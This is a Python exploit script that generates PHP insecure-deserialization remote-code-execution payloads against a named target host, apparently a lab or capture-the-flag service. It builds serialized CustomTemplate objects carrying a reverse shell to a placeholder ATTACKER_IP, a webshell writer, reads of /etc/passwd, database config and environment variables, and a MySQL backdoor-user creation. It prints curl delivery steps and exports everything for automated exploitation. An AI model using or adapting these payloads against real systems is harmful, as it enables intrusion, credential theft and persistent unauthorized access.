#!/usr/bin/env python3
"""
PHP Insecure Deserialization RCE Payload Generator
Target: http://skumodel:4455/read_sku.php + sku_process.php
Vulnerability: Unserialize + eval() in CustomTemplate.__wakeup()

This script generates ready-to-use RCE payloads for exploitation.
"""

import base64
import sys
import json

class PHPSerializationPayloadGenerator:
    """Generate PHP serialized CustomTemplate objects with RCE payloads"""
    
    def __init__(self):
        self.class_name = "CustomTemplate"
        self.template_value = "test.twig"
        self.property_count = 2
        
    def generate_serialized_object(self, php_code):
        """
        Generate a PHP serialized object with RCE payload.
        
        PHP Serialization Format:
        O:class_name_len:"class_name":property_count:{
            s:key_len:"key";value_serialization;
            ...
        }
        """
        
        # Build the serialized string
        class_len = len(self.class_name)
        template_len = len(self.template_value)
        data_len = len(php_code)
        
        serialized = (
            f'O:{class_len}:"{self.class_name}":{self.property_count}:{{'
            f's:8:"template";s:{template_len}:"{self.template_value}";'
            f's:4:"data";s:{data_len}:"{php_code}";'
            f'}}'
        )
        
        return serialized
    
    def generate_payload(self, name, php_code):
        """Generate a complete RCE payload with serialization and encoding"""
        
        serialized = self.generate_serialized_object(php_code)
        base64_encoded = base64.b64encode(serialized.encode()).decode()
        
        return {
            'name': name,
            'php_code': php_code,
            'serialized': serialized,
            'base64': base64_encoded,
            'length': len(serialized),
            'base64_length': len(base64_encoded)
        }
    
    def generate_all_payloads(self):
        """Generate a collection of useful RCE payloads"""
        
        payloads = [
            {
                'name': 'File Write (Proof of RCE)',
                'description': 'Write a file to /tmp to prove code execution',
                'code': "file_put_contents('/tmp/pwned_by_deserialization.txt', 'RCE executed at ' . date('Y-m-d H:i:s'));"
            },
            {
                'name': 'Command Execution - whoami',
                'description': 'Execute whoami command',
                'code': "echo shell_exec('whoami');"
            },
            {
                'name': 'Command Execution - id',
                'description': 'Execute id command',
                'code': "echo shell_exec('id');"
            },
            {
                'name': 'System Information',
                'description': 'Dump PHP environment and system information',
                'code': "echo json_encode(['rce' => 'success', 'php_version' => phpversion(), 'user' => get_current_user(), 'cwd' => getcwd(), 'uname' => php_uname()]);"
            },
            {
                'name': 'List /tmp Directory',
                'description': 'List files in /tmp directory',
                'code': "echo json_encode(scandir('/tmp'));"
            },
            {
                'name': 'Read /etc/passwd',
                'description': 'Read /etc/passwd file',
                'code': "echo file_get_contents('/etc/passwd');"
            },
            {
                'name': 'Read /etc/hostname',
                'description': 'Read hostname',
                'code': "echo file_get_contents('/etc/hostname');"
            },
            {
                'name': 'Create Web Shell',
                'description': 'Create a simple PHP webshell',
                'code': "file_put_contents('/tmp/shell.php', '<?php system($_GET[\"cmd\"]); ?>');"
            },
            {
                'name': 'Reverse Shell (Bash)',
                'description': 'Reverse shell to attacker machine (template)',
                'code': "$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);exec('/bin/bash -i <&3 >&3 2>&3');"
            },
            {
                'name': 'List PHP Configuration',
                'description': 'Show PHP configuration',
                'code': "echo json_encode(ini_get_all());"
            },
            {
                'name': 'Extract Database Credentials',
                'description': 'Read database configuration',
                'code': "echo file_get_contents('database.php');"
            },
            {
                'name': 'Execute Arbitrary Script',
                'description': 'Execute PHP script from file',
                'code': "include('/tmp/malicious.php');"
            },
            {
                'name': 'Create Backdoor User (MySQL)',
                'description': 'Create MySQL backdoor user',
                'code': "$db = new PDO('mysql:host=localhost', 'root', 'password'); $db->exec(\"CREATE USER 'hacker'@'%' IDENTIFIED BY 'hacked';\");"
            },
            {
                'name': 'Dump Environment Variables',
                'description': 'Extract all environment variables',
                'code': "echo json_encode($_ENV);"
            }
        ]
        
        results = []
        for payload in payloads:
            result = self.generate_payload(
                payload['name'],
                payload['code']
            )
            result['description'] = payload['description']
            results.append(result)
        
        return results

def main():
    """Main execution"""
    
    generator = PHPSerializationPayloadGenerator()
    
    print("[*] PHP Insecure Deserialization RCE Payload Generator")
    print("[*] Target: http://skumodel:4455/read_sku.php")
    print("[*] Attack Chain: sku_process.php -> read_sku.php")
    print("[*] Vulnerability: Unserialize + eval() in __wakeup()")
    print()
    
    payloads = generator.generate_all_payloads()
    
    print(f"[*] Generated {len(payloads)} RCE payloads:")
    print()
    
    for i, payload in enumerate(payloads, 1):
        print(f"{'=' * 70}")
        print(f"[{i}] {payload['name']}")
        print(f"{'=' * 70}")
        print(f"Description: {payload['description']}")
        print(f"PHP Code ({payload['length']} bytes):")
        print(f"  {payload['php_code']}")
        print()
        print(f"Serialized ({len(payload['serialized'])} bytes):")
        print(f"  {payload['serialized'][:100]}...")
        print()
        print(f"Base64 Encoded ({payload['base64_length']} bytes):")
        print(f"  {payload['base64'][:100]}...")
        print()
        print(f"Usage:")
        print(f"  1. Upload to sku_process.php:")
        print(f"     curl -X POST http://skumodel:4455/sku_process.php \\")
        print(f"          -d 'data={payload['base64'][:50]}...'")
        print()
        print(f"  2. Trigger RCE via read_sku.php:")
        print(f"     curl -X POST http://skumodel:4455/read_sku.php \\")
        print(f"          -d 'file_path=/tmp/UPLOAD_HASH.jpg'")
        print()
    
    # Export payloads to JSON for automated exploitation
    json_output = {
        'generator': 'PHPSerializationPayloadGenerator',
        'target': 'http://skumodel:4455/read_sku.php',
        'vulnerability': 'PHP Object Injection + eval() RCE',
        'payloads': payloads
    }
    
    output_file = '/tmp/php_rce_payloads.json'
    with open(output_file, 'w') as f:
        json.dump(json_output, f, indent=2)
    
    print(f"\n[+] Payloads exported to: {output_file}")
    print(f"[+] Exploitation workflow documented in POC scripts")

if __name__ == '__main__':
    main()

